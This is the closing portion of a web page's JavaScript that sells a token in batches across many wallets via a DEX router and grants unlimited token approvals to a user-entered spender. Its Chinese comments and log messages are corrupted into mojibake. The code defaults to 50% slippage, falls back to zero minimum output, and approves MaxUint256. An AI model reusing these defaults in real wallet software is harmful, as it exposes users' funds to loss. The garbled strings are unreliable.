                const slippage = parseFloat(document.getElementById('sellSlippage').value) || 50;
                const delay = parseInt(document.getElementById('sellDelay').value) || 0;
                const maxConcurrent = 3; // ÂáèÂ∞ëÂπ∂ÂèëÈÅøÂÖçÂΩ±Âìç‰ª∑Ê†º

                if (!tokenAddress) {
                    alert('ËØ∑ËæìÂÖ•‰ª£Â∏ÅÂú∞ÂùÄ');
                    return;
                }

                addLog(`ÂºÄÂßãÊâπÈáèÂçñÂá∫ÔºåÂÖ± ${selected.length} ‰∏™Èí±ÂåÖÔºåÂçñÂá∫ ${percentage}%ÔºåÊªëÁÇπ ${slippage}%`, 'info');

                const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);

                // ÂàõÂª∫‰ªªÂä°Êï∞ÁªÑ
                const tasks = selected.map((w, i) => async () => {
                    if (delay > 0 && i > 0) {
                        await new Promise(r => setTimeout(r, delay * 1000));
                    }
                    
                    try {
                        // Ëé∑Âèñ‰ΩôÈ¢ù
                        const balance = await tokenContract.balanceOf(w.address);
                        const sellAmount = balance * BigInt(percentage) / 100n;
                        
                        if (sellAmount === 0n) {
                            addLog(`${w.address.slice(0, 8)}... Êó†‰ΩôÈ¢ù`, 'warning');
                            return null;
                        }

                        // Ê£ÄÊü•ÊéàÊùÉ
                        const tokenWithSigner = new ethers.Contract(tokenAddress, ERC20_ABI, w.wallet);
                        const allowance = await tokenWithSigner.allowance(w.address, CONFIG.routerAddress);
                        
                        if (allowance < sellAmount) {
                            addLog(`${w.address.slice(0, 8)}... ÊâßË°åÊéàÊùÉ`, 'info');
                            const approveTx = await tokenWithSigner.approve(CONFIG.routerAddress, ethers.MaxUint256);
                            await approveTx.wait();
                            addLog(`${w.address.slice(0, 8)}... ÊéàÊùÉÊàêÂäü`, 'success');
                        }

                        // ÊâßË°åÂçñÂá∫
                        const router = new ethers.Contract(CONFIG.routerAddress, ROUTER_ABI, w.wallet);
                        const path = [tokenAddress, CONFIG.wethAddress];
                        
                        // Ëé∑ÂèñÈ¢ÑÊúüËæìÂá∫
                        let amountOutMin = 0n;
                        try {
                            const amounts = await router.getAmountsOut(sellAmount, path);
                            if (slippage < 100) {
                                amountOutMin = amounts[1] * BigInt(Math.floor((100 - slippage) * 100)) / 10000n;
                            }
                            const expectedGT = ethers.formatEther(amounts[1]);
                            addLog(`${w.address.slice(0, 8)}... È¢ÑÊúüËé∑Âæó ${expectedGT} GT`, 'info');
                        } catch (e) {
                            addLog(`${w.address.slice(0, 8)}... Êó†Ê≥ïËé∑ÂèñÊä•‰ª∑Ôºå‰ΩøÁî®0ÊúÄÂ∞èËæìÂá∫`, 'warning');
                        }
                        
                        const deadline = Math.floor(Date.now() / 1000) + 1200;
                        
                        addLog(`${w.address.slice(0, 8)}... ÂèëÈÄÅÂçñÂá∫‰∫§Êòì`, 'info');
                        
                        // ‰ΩøÁî®ÊîØÊåÅÊâãÁª≠Ë¥πÁöÑswapÂáΩÊï∞
                        const tx = await router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                            sellAmount,
                            amountOutMin,
                            path,
                            w.address,
                            deadline
                            // ÁßªÈô§Âõ∫ÂÆöÁöÑgasLimitÔºåËÆ©Á≥ªÁªüËá™Âä®‰º∞ÁÆó
                        );
                        
                        const receipt = await tx.wait();
                        addLog(`${w.address.slice(0, 8)}... ÂçñÂá∫ÊàêÂäü ‚úì Hash: ${receipt.hash.slice(0, 10)}...`, 'success');
                        return receipt.hash;
                        
                    } catch (e) {
                        if (e.message && e.message.includes('GateSwap: K')) {
                            addLog(`${w.address.slice(0, 8)}... ÂçñÂá∫Â§±Ë¥•: ÊµÅÂä®ÊÄß‰∏çË∂≥ÔºåËØ∑ÂáèÂ∞ëÂçñÂá∫ÈáëÈ¢ù`, 'error');
                        } else {
                            addLog(`${w.address.slice(0, 8)}... ÂçñÂá∫Â§±Ë¥•: ${e.message || e}`, 'error');
                        }
                        throw e;
                    }
                });

                const results = await batchExecute(tasks, maxConcurrent);
                const successCount = results.filter(r => r && r.success).length;
                const failCount = results.filter(r => r && !r.success).length;
                
                addLog(`ÊâπÈáèÂçñÂá∫ÂÆåÊàê: ${successCount} ÊàêÂäü, ${failCount} Â§±Ë¥•`, 
                    failCount === 0 ? 'success' : 'warning');
                
                refreshBalances();
            }

            // ÊâßË°åÊéàÊùÉ
            async function executeApprove() {
                const selected = wallets.filter(w => w.selected);
                if (selected.length === 0) {
                    alert('ËØ∑ÈÄâÊã©Èí±ÂåÖ');
                    return;
                }

                const tokenAddress = document.getElementById('approveTokenAddress').value;
                const spender = document.getElementById('approveSpender').value;
                const maxConcurrent = 5;

                if (!tokenAddress || !spender) {
                    alert('ËØ∑Â°´ÂÜôÂÆåÊï¥‰ø°ÊÅØ');
                    return;
                }

                addLog(`ÂºÄÂßãÊâπÈáèÊéàÊùÉÔºåÂÖ± ${selected.length} ‰∏™Èí±ÂåÖ`, 'info');

                const tasks = selected.map(w => async () => {
                    try {
                        const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, w.wallet);
                        
                        addLog(`${w.address.slice(0, 8)}... ÂèëÈÄÅÊéàÊùÉ‰∫§Êòì`, 'info');
                        
                        const tx = await tokenContract.approve(spender, ethers.MaxUint256);
                        await tx.wait();
                        
                        addLog(`${w.address.slice(0, 8)}... ÊéàÊùÉÊàêÂäü ‚úì`, 'success');
                        return tx.hash;
                        
                    } catch (e) {
                        addLog(`${w.address.slice(0, 8)}... ÊéàÊùÉÂ§±Ë¥•: ${e.message}`, 'error');
                        throw e;
                    }
                });

                const results = await batchExecute(tasks, maxConcurrent);
                const successCount = results.filter(r => r.success).length;
                const failCount = results.filter(r => !r.success).length;
                
                addLog(`ÊâπÈáèÊéàÊùÉÂÆåÊàê: ${successCount} ÊàêÂäü, ${failCount} Â§±Ë¥•`, 
                    failCount === 0 ? 'success' : 'warning');
            }

            // ÂêØÂä®ÂàùÂßãÂåñ
            init();
        });
    </script>
</body>
</html>